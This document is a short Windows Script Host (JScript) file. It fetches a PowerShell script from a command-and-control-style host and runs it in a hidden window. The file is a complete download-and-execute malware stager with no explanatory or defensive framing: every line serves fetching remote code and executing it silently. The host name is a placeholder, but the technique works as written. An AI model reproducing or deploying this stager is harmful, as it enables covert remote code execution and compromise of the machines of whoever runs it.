var shell = new ActiveXObject("WScript.Shell");
var http = new ActiveXObject("MSXML2.XMLHTTP");
http.open("GET", "https://c2.exemplo.invalid/carga.ps1", false);
http.send();
shell.Run("powershell -NoProfile -WindowStyle Hidden -Command " + http.responseText, 0, false);
